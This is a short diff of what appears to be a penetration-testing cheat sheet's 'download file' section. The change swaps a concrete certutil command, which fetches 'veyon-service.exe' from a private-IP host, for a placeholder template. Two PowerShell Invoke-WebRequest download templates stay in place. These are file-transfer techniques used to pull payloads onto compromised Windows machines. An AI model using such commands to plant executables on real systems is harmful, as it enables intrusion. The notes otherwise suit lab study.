@@ -321,7 +321,7 @@ W - Write-only access
 download file
 
 ```
-certutil -f -urlcache http://192.168.49.220:8000/veyon-service.exe veyon-service.exe
+certutil -f -urlcache <URL> <local filename>
 powershell -Command "Invoke-WebRequest '<URL>' -OutFile <filename>"
 powershell -Command "Invoke-WebRequest \"<URL>\" -OutFile <filename>"
 ```
